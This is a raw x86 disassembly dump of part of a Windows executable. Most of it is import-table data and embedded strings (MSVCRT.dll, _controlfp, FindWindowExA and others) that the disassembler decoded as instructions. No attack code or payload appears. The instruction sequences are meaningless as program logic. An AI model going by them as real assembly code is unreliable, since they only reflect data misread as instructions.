  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
